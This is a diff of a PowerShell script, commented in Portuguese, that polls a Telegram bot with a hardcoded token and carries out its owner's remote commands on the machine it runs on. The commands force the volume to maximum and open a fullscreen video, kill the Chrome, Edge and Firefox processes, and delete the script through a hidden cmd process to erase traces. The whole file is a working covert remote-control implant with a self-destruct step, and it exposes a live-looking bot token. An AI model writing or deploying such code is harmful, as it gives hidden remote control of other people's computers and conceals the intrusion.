@@ -1,32 +1,40 @@
 $token = "8268716558:AAH_sjcx5wfc_Y33KeSGfHv7zek1wsDZ5Z0"
 $meuID = "5974171362"
 $url = "https://api.telegram.org/bot$token/getUpdates"
-
-Write-Host "Bot aguardando ordens..."
+$caminhoScript = $MyInvocation.MyCommand.Path # Localiza onde o script está salvo
 
 while($true) {
     try {
-        # Consulta as últimas mensagens no bot
         $response = Invoke-RestMethod -Uri $url -UseBasicParsing
         $ultimaMsg = $response.result[-1].message.text
         $quemMandou = $response.result[-1].message.from.id
 
-        # Verifica se a mensagem foi enviada por VOCÊ
         if ($quemMandou -eq $meuID) {
             
+            # COMANDO 1: EXECUTAR VÍDEO
             if ($ultimaMsg -eq "/video") {
-                # Aumenta o volume e abre o vídeo
                 $obj = New-Object -ComObject WScript.Shell
                 for($i=0; $i -le 50; $i++) { $obj.SendKeys([char]175) }
-                start "https://www.youtube.com/watch?v=qHoAEWK59nE&list=RDqHoAEWK59nE&start_radio=1"
+                start "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
                 Start-Sleep -Seconds 5
-                $obj.SendKeys('f') # Tela cheia
+                $obj.SendKeys('f')
+            }
+
+            # COMANDO 2: FECHAR NAVEGADOR (Chrome, Edge ou Firefox)
+            elseif ($ultimaMsg -eq "/fechar") {
+                Stop-Process -Name "chrome","msedge","firefox" -Force -ErrorAction SilentlyContinue
+            }
+
+            # COMANDO 3: APAGAR TUDO E SAIR (Autodestruição)
+            elseif ($ultimaMsg -eq "/limpar") {
+                # Avisa que vai sumir
+                Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$meuID&text=Apagando rastros e encerrando..."
                 
-                # Opcional: Avisar no seu celular que deu certo
-                Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage?chat_id=$meuID&text=Vídeo executado!"
+                # Cria um processo separado para deletar o arquivo após o script fechar
+                Start-Process cmd.exe -ArgumentList "/c timeout /t 2 && del `"$caminhoScript`"" -WindowStyle Hidden
+                exit
             }
         }
     } catch { }
-    
-    Start-Sleep -Seconds 5 # Espera 5 segundos para não sobrecarregar
+    Start-Sleep -Seconds 5
 }
